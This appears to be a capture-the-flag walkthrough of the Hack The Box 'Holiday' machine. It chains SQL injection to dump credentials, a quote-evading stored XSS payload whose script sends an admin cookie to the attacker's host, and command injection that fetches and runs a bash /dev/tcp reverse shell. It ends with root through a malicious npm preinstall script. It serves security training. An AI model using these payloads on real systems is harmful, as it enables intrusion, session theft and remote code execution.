# Hack The Box - Holiday: Comprehensive Step-by-Step Walkthrough

**Machine:** Holiday  
**Difficulty:** Hard  
**OS:** Linux  
**Target IP:** `10.129.29.106`  
**Attacker IP:** `10.10.16.84`  
**Flags:**
- User: `517f7d[redacted]e48b15372f`
- Root: `6ff8785[redacted]d5a68180`

---

## Table of Contents
1. [Overview & Attack Chain](#overview--attack-chain)
2. [Step 1: Reconnaissance - Port Scanning](#step-1-reconnaissance---port-scanning)
3. [Step 2: Web Enumeration - The User-Agent Trap](#step-2-web-enumeration---the-user-agent-trap)
4. [Step 3: SQL Injection - Breaking the Login](#step-3-sql-injection---breaking-the-login)
5. [Step 4: Stored XSS - Stealing the Admin Session](#step-4-stored-xss---stealing-the-admin-session)
6. [Step 5: Command Injection - From Admin to Shell](#step-5-command-injection---from-admin-to-shell)
7. [Step 6: Privilege Escalation - npm install as Root](#step-6-privilege-escalation---npm-install-as-root)
8. [Key Takeaways & Lessons Learned](#key-takeaways--lessons-learned)

---

## Overview & Attack Chain

Holiday is a classic "chained vulnerability" machine. There is no single magic bullet. Instead, you must exploit **four distinct vulnerabilities in sequence**:

1. **User-Agent Filtering Bypass** → Find hidden endpoints that standard tools miss.
2. **SQL Injection** → Extract credentials from the login form.
3. **Stored Cross-Site Scripting (XSS)** → Steal an administrator's session cookie.
4. **Command Injection** → Execute arbitrary system commands as the web server user (`algernon`).
5. **Sudo Abuse (npm)** → Escalate from `algernon` to `root`.

**Hacker Mindset:** *Hard boxes rarely give you a direct shell. Look for small cracks, exploit them to get a foothold, then use that foothold to find the next crack. Each exploit gives you access to something the previous one didn't.*

---

## Step 1: Reconnaissance - Port Scanning

### What We Did

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.29.106
nmap -p 22,8000 -sC -sV -oA scans/nmap-tcpscripts 10.129.29.106
```

### Baby Step Breakdown

**Why `nmap -p-`?**  
By default, Nmap only scans the top 1000 ports. A hard box often runs services on non-standard ports. If we only scanned the top 1000, we might miss port 8000 (or a high port like 31337). The `-p-` flag tells Nmap to scan **all 65,535 ports**.

**Why `--min-rate 10000`?**  
This tells Nmap to send at least 10,000 packets per second. Without this, scanning all ports can take 20-30 minutes. We speed it up because we are on a relatively stable network (Hack The Box VPN).

**Why `-sC` and `-sV` on the second scan?**  
`-sC` runs Nmap's default script suite (like checking for SSH host keys, HTTP titles, etc.). `-sV` performs version detection. We only run these on the ports we already know are open (22 and 8000) because they are much slower than the initial port discovery.

### Results

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
8000/tcp open  http    Node.js Express framework
```

**What This Tells Us:**
- We have SSH access, but we don't have credentials yet. SSH on HTB Linux boxes is usually for the final shell or for tunneling, not the initial entry point.
- Port 8000 is running a web application built on **Node.js with Express**. This is our attack surface.

**Hacker Mindset:** *When you see a web application, your brain should immediately think: "What endpoints exist? What forms are there? What headers does it care about?" Web apps are the most common entry point on HTB.*

---

## Step 2: Web Enumeration - The User-Agent Trap

### What We Did

We tried `gobuster` with a standard wordlist. It found **nothing**.

```bash
gobuster dir -u http://10.129.29.106:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Then we tried `dirsearch` and it found `/login`, `/admin`, `/logout`, etc.:

```bash
dirsearch -u http://10.129.29.106:8000 --user-agent="Linux"
```

### Baby Step Breakdown

**Why did Gobuster fail?**  
The application has a **User-Agent filter**. If your tool sends a User-Agent like `gobuster/3.8.2`, the server returns **404 Not Found** for every endpoint—even if the page exists. `dirsearch` sends a realistic browser User-Agent by default (`Mozilla/5.0...`), so it saw the real pages.

**How did we figure this out?**  
This is the critical hacker mindset: **when two tools give different results, compare their requests.** We could have used Burp Suite to intercept both requests and noticed the only major difference was the `User-Agent` header. By changing the User-Agent to `Linux`, `gobuster` also worked.

**Why does the filter exist?**  
The developer probably wanted to block bots and crawlers. They assumed that only desktop and mobile browsers would have legitimate User-Agent strings. This is a form of **security through obscurity**—it doesn't actually fix any vulnerabilities, it just makes them slightly harder to find.

**The Code Behind It (from source analysis):**
The app uses `express-useragent`. It checks `req.useragent.isDesktop || req.useragent.isMobile`. If neither is true, it returns 404. The library recognizes OS strings like `Linux`, `Windows`, `Mac`, `cros`, etc.

### Commands That Work

```bash
# Using dirsearch (has good default UA)
dirsearch -u http://10.129.29.106:8000 --user-agent="Linux"

# Using gobuster (must specify UA)
gobuster dir -u http://10.129.29.106:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --useragent "Linux"
```

### Results

```
/admin  -> /login (302)
/login  (200)
/logout -> /login (302)
/css, /js, /img (301)
```

**Hacker Mindset:** *Never trust a single tool. If enumeration feels "empty," it's often not because the target is empty—it's because you're being filtered, rate-limited, or blocked. Always question your tools before questioning the target. Look at the raw HTTP requests and responses.*

---

## Step 3: SQL Injection - Breaking the Login

### What We Did

We visited `/login` and saw a standard username/password form. We tested for SQL injection and found that the **username** field was vulnerable to injection using a **double quote `"`**.

### Baby Step Breakdown

**Step 3a: Testing for SQL Injection**  

We started by sending single and double quotes to see if the application behaves differently:

```bash
curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
  -d 'username=%22' -d 'password=admin' | grep -i error
```

- `'` (single quote) → "Invalid User"
- `"` (double quote) → "Error Occurred"

**Why does this matter?**  
The "Error Occurred" message is a **database error**. This tells us the backend tried to process our input as part of a SQL query and failed. The single quote didn't cause an error, meaning the query probably wraps the username in double quotes (or doesn't use quotes at all for that parameter).

**Hacker Mindset:** *Always test with BOTH `'` and `"`. Developers often remember to sanitize one but forget the other. Error messages are your best friend—they tell you exactly what the database is thinking.*

**Step 3b: Bypassing the Username Check**  

We tried a classic OR-based bypass:

```bash
curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
  -d 'username=%22%20OR%20%221%22%3D%221' -d 'password=admin'
```

Decoded: `username=" OR "1"="1`

Result: **"Incorrect Password"** — and the username field was prefilled with **`RickA`**.

**Why did this happen?**  
The query structure is something like:
```sql
SELECT id, username, password, active 
FROM users 
WHERE (active=1 AND (username = "[INPUT]"))
```

Our input turned it into:
```sql
WHERE (active=1 AND (username = "" OR "1"="1"))
```

Since `"1"="1"` is always true, the `WHERE` clause returns the first active user in the table: **RickA**. The application then checked our password (which was wrong) and showed "Incorrect Password" with RickA's username prefilled.

**Hacker Mindset:** *A "Incorrect Password" message after a bypass is often MORE valuable than a successful login. It confirms the user exists and gives you their username.*

**Step 3c: UNION Injection to Extract Data**  

Now we wanted to dump the database. We used `UNION SELECT` to add our own fake row to the result set. But a `UNION` requires the same number of columns as the original query.

We tested column counts:
```sql
")) UNION SELECT 1 -- -          → Error
")) UNION SELECT 1,2 -- -        → Error
")) UNION SELECT 1,2,3 -- -      → Error
")) UNION SELECT 1,2,3,4 -- -    → No error! Username field shows "2"
```

**Why 4 columns?**  
The original query must be selecting 4 columns: probably `id, username, password, active` (which matches the table schema we later confirmed).

**Step 3d: Extracting Credentials**  

We replaced the `2` with data we wanted:

```bash
# Dump username
curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
  -d 'username=%22%29%29%20UNION%20SELECT%201%2Cgroup_concat%28username%29%2C3%2C4%20FROM%20users--%20-' \
  -d 'password=admin' | grep -oP 'value="\K[^"]+'
# Result: RickA

# Dump password hash
curl -s -A "Linux" -X POST http://10.129.29.106:8000/login \
  -d 'username=%22%29%29%20UNION%20SELECT%201%2Cpassword%2C3%2C4%20FROM%20users--%20-' \
  -d 'password=admin' | grep -oP 'value="\K[^"]+'
# Result: fdc8cd4cff2c19e0d1022e78481ddf36
```

**Cracking the Hash:**
```bash
echo -n "nevergonnagiveyouup" | md5sum
# Output: fdc8cd4cff2c19e0d1022e78481ddf36
```

**Hacker Mindset:** *32-character hex strings are almost always MD5. Before wasting time with Hashcat, try an online database or a quick `md5sum` of common passwords. This hash is a Rickroll reference—always try pop culture references on HTB boxes.*

---

## Step 4: Stored XSS - Stealing the Admin Session

### What We Did

We logged in as `RickA` and landed on `/agent` with a list of bookings. Clicking a booking showed a **Notes** tab. There was a message: *"All notes must be approved by an administrator."* We submitted a malicious note that executed JavaScript in the admin's browser, stealing their session cookie.

### Baby Step Breakdown

**Step 4a: Recognizing the Vulnerability**  

The phrase "must be approved by an administrator" is a **massive red flag**. It implies:
1. There is an automated admin process (a bot).
2. The bot views the page containing our input.
3. If our input isn't properly sanitized, the bot will execute our code.

This is a **Stored XSS** vulnerability. "Stored" means the payload is saved in the database (as a note) and executed later when someone (the admin bot) views it.

**Hacker Mindset:** *Whenever you see "pending approval," "waiting for moderator," or "under review," immediately think XSS. The system is literally telling you that a higher-privilege entity will view your input.*

**Step 4b: Testing the XSS Filter**  

We first tested a simple image tag to confirm the bot makes external requests:
```html
<img src='http://10.10.16.84/test.jpg' />
```
Within a minute, we saw a hit on our Python web server from the target IP.

Then we tried a basic script:
```html
<script>alert('XSS')</script>
```
The result was mangled—the quotes were stripped, but the script tags survived partially.

**Why did some parts survive?**  
The application uses a flawed XSS filter (`xss` npm package). The filter was configured with a **whitelist** allowing only `<img src="...">`. For the `src` attribute, it removed spaces, single quotes, and double quotes. However, the filtering logic had a gap: it processed the `src` value but didn't completely neutralize script tags that were cleverly embedded inside.

**Step 4c: Filter Evasion with String.fromCharCode**  

The filter removed quotes, so we couldn't write JavaScript like:
```javascript
document.location='http://10.10.16.84/?c='+document.cookie
```

Instead, we encoded our entire payload as **ASCII/Unicode character codes** and used `String.fromCharCode()` to reconstruct it at runtime:

```python
payload = """document.write('<script src="http://10.10.16.84/x.js"></script>')"""
nums = [str(ord(i)) for i in payload]
print('<img src="x/><script>eval(String.fromCharCode('+','.join(nums)+'));</script>">')
```

**Why does this work?**  
The filter sees numbers and commas—completely harmless characters. It doesn't understand that `eval(String.fromCharCode(...))` will reconstruct dangerous strings at execution time. This is a classic **filter evasion** technique.

**The Final Payload:**
```html
<img src="x/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,54,46,56,52,47,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59));</script>">
```

**Step 4d: The External JavaScript File (x.js)**  

Why use an external file instead of putting everything in the payload?  
Because the filter is unpredictable. By loading an external script, we have full control over the code that executes. The external script runs in the admin's browser with admin privileges.

We created `x.js`:
```javascript
window.addEventListener('DOMContentLoaded', function(e) {
    window.location = "http://10.10.16.84:81/?cookie=" + encodeURI(document.getElementsByName("cookie")[0].value)
})
```

**Why `document.getElementsByName("cookie")`?**  
The application renders a hidden input on the booking page:
```html
<input type="hidden" name="cookie" value="connect.sid=...">
```
Our script reads this value and sends it to our listener.

**Step 4e: Setting Up Listeners**  

Terminal 1 (serve the malicious JS):
```bash
sudo python3 -m http.server 80
```

Terminal 2 (catch the exfiltrated cookie):
```bash
nc -lnvp 81
```

**Step 4f: Submitting the Note**  

1. Log in to `http://10.129.29.106:8000/login` as `RickA` / `nevergonnagiveyouup`.
2. Click any booking.
3. Go to the **Notes** tab.
4. Paste the generated payload.
5. Submit and wait ~60 seconds.

**Result:**
```
GET /?cookie=connect.sid=s%253Ad5615f50-5d19-11f1-9c8f-7de48e21f7db.pm%252Bk81sZw90lV0029qnm1CbmRkbIR1zTWwPFCVvJOc4 HTTP/1.1
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
```

The `User-Agent: PhantomJS/2.1.1` confirms the "administrator" is actually a **headless browser bot**.

**Hacker Mindset:** *XSS is not just about popping alerts. It's about stealing sessions, performing actions on behalf of victims, and pivoting to higher privileges. Always think: "What does the victim have access to that I don't?" The admin had `/admin`. We wanted `/admin`.*

---

## Step 5: Command Injection - From Admin to Shell

### What We Did

We replaced our browser cookie with the stolen admin cookie and accessed `/admin`. There was an "Export" feature that downloaded data. The export endpoint was vulnerable to **command injection** via the `table` parameter.

### Baby Step Breakdown

**Step 5a: Accessing the Admin Panel**  

With the admin cookie, we visited `http://10.129.29.106:8000/admin`. We saw an "Export Bookings" and "Export Notes" button.

**Step 5b: Discovering Command Injection**  

The export request looked like:
```
GET /admin/export?table=bookings
```

We tried other known table names like `users` and it worked. But when we tried special characters, we got an error:
```
Invalid table name - only characters in the range of [a-z0-9&\s\/] are allowed
```

**Why is this interesting?**  
The error message is overly specific. It tells us the **exact regex** used to filter input: `/[^a-z0-9& \s\/]/g`. Most importantly, the **`&` (ampersand)** is allowed.

**Step 5c: Why & Leads to Command Injection**  

The backend code looks something like:
```javascript
exec('sqlite3 hex.db SELECT\ *\ FROM\ ' + filteredTable, ...)
```

When we send `table=users&id`, the shell sees:
```bash
sqlite3 hex.db SELECT * FROM users&id
```

In bash, a single `&` means: **"Run the command before me in the background, then run the command after me."** So `sqlite3 ...` runs in the background, and then `id` executes.

We verified this:
```bash
curl -s -A "Linux" \
  -b "connect.sid=s:d5615f50-5d19-11f1-9c8f-7de48e21f7db.pm+k81sZw90lV0029qnm1CbmRkbIR1zTWwPFCVvJOc4" \
  "http://10.129.29.106:8000/admin/export?table=x%26id"
```

Result: `uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)`

**Hacker Mindset:** *When you see an allowlist filter, look at what IS allowed, not just what's blocked. The developer allowed `&` thinking it was harmless, but they forgot it has special meaning in bash. Always ask: "How does the backend use this input?" If it's passed to `exec()`, `system()`, `eval()`, or a shell command, special characters become dangerous.*

**Step 5d: Getting a Reverse Shell**  

We needed to get a proper interactive shell. The problem: most reverse shell payloads contain characters blocked by the filter (`;`, `|`, `>`, `$`, `(`, `)`, etc.).

**The Solution:** Write the complex payload to a file on Kali, download it with `wget` (which only uses allowed characters), then execute it with `bash` (also only allowed characters).

**The Decimal IP Trick:**  
`wget` requires an IP address, but the `.` (dot) is **blocked** by the filter! However, Linux allows IP addresses to be written as integers.

Converting `10.10.16.84`:
```
(10 * 256^3) + (10 * 256^2) + (16 * 256) + 84 = 168431700
```

So `wget 168431700/rs` is equivalent to `wget http://10.10.16.84/rs`.

**Preparing the payload file (`rs`):**
```bash
cat > rs << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.84/9000 0>&1
EOF
```

**Why `/dev/tcp`?**  
This is a bash feature that creates a TCP socket. It allows us to get a reverse shell without needing `nc`, `python`, or `perl` on the target. The payload is entirely self-contained in bash.

**Execution steps:**

1. Start listener on Kali:
```bash
nc -lnvp 9000
```

2. Ensure your web server is running (serving `rs`):
```bash
sudo python3 -m http.server 80
```

3. Download the file to the target:
```bash
curl -s -A "Linux" \
  -b "connect.sid=s:d5615f50-5d19-11f1-9c8f-7de48e21f7db.pm+k81sZw90lV0029qnm1CbmRkbIR1zTWwPFCVvJOc4" \
  "http://10.129.29.106:8000/admin/export?table=x%26wget+168431700/rs"
```

The command executed server-side becomes:
```bash
sqlite3 hex.db SELECT * FROM x & wget 168431700/rs
```

4. Execute the downloaded file:
```bash
curl -s -A "Linux" \
  -b "connect.sid=s:d5615f50-5d19-11f1-9c8f-7de48e21f7db.pm+k81sZw90lV0029qnm1CbmRkbIR1zTWwPFCVvJOc4" \
  "http://10.129.29.106:8000/admin/export?table=x%26bash+rs"
```

**Result:** We received a shell on `nc -lnvp 9000` as `algernon`.

```
uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
```

**Hacker Mindset:** *When faced with a restrictive filter, break the problem into smaller pieces. You don't need to fit your entire reverse shell into one filtered parameter. Download a file first, then execute it. And always remember alternative IP representations—hexadecimal, decimal, octal. They bypass character filters on dots.*

---

## Step 6: Privilege Escalation - npm install as Root

### What We Did

As `algernon`, we ran `sudo -l` and discovered we could run `npm i *` as root without a password. We created a malicious Node.js package with a `preinstall` script that spawned `/bin/bash`, installed it with `sudo`, and got root.

### Baby Step Breakdown

**Step 6a: Always Check `sudo -l` First**  

The very first thing you should do on any Linux box after getting a shell is:
```bash
sudo -l
```

This lists what commands the current user can run with elevated privileges.

**Result:**
```
User algernon may run the following commands on holiday:
    (ALL) NOPASSWD: /usr/bin/npm i *
```

**Why is this dangerous?**  
`npm i` (npm install) doesn't just copy files. It executes **lifecycle scripts** defined in the package's `package.json`. These scripts include:
- `preinstall` — runs before installation
- `install` — runs during installation
- `postinstall` — runs after installation

If `npm` runs as root, these scripts run as root.

**Hacker Mindset:** *Sudo privileges on package managers (npm, pip, gem, apt, etc.) are almost always exploitable. Package managers are designed to execute arbitrary code during installation. If you can install as root, you own the box.*

**Step 6b: Crafting the Malicious Package**  

We created a minimal `package.json`:
```json
{
  "name": "root_please",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
```

**Why does this work?**  
When npm installs this package, it sees the `preinstall` script and executes `/bin/bash` **before** copying any files. Since `sudo` invoked `npm`, the bash shell inherits root privileges.

**Why `--unsafe`?**  
Running `npm` as root sometimes triggers safety warnings or permission checks. The `--unsafe` flag (or `--unsafe-perm`) tells npm to bypass these checks and run scripts anyway.

**Step 6c: Execution**  

```bash
mkdir -p /dev/shm/privesc && cd /dev/shm/privesc
cat > package.json << 'EOF'
{
  "name": "root_please",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
EOF
sudo npm i /dev/shm/privesc --unsafe
```

**Output:**
```
> root_please@1.0.0 preinstall /dev/shm/privesc
> /bin/bash

id
uid=0(root) gid=0(root) groups=0(root)
```

**Step 6d: Capturing the Root Flag**  

```bash
cat /root/root.txt
# 6ff878[redacted]cd5a68180
```

**Hacker Mindset:** *Privilege escalation is often about abusing legitimate features, not exploiting memory corruption. `sudo npm i` is a feature that works exactly as designed—the design is just dangerous. Always look for "intended functionality" that has unintended security consequences.*

---

## Key Takeaways & Lessons Learned

### 1. Enumeration Depth Matters
If `gobuster` returns nothing, it doesn't mean the site is empty. Headers, cookies, and User-Agents can completely change the application's behavior. Always inspect raw traffic.

### 2. Error Messages Are Information Leaks
"Invalid User" vs "Error Occurred" vs "Incorrect Password" each tell you something different about the backend logic. Never ignore error messages.

### 3. Chained Exploits Are Common on Hard Boxes
You didn't get a shell from SQLi. You got credentials. From credentials, you got XSS. From XSS, you got an admin session. From admin session, you got command injection. From command injection, you got a shell. Each step required the previous one.

### 4. Filter Evasion Requires Creativity
When quotes are stripped, use `String.fromCharCode()`. When dots are blocked, use decimal IPs. When special characters are blocked in the command, download a file and execute it separately.

### 5. Package Manager Sudo = Root
`npm`, `pip`, `gem`, `apt`, `yum`—all of these execute code. If a user can run any of these with `sudo`, they can escalate to root by design.

### 6. The Admin Bot Pattern
Any feature mentioning "approval," "review," or "moderation" implies an automated user with higher privileges. That's your XSS target.

---

*Happy Hacking!* 
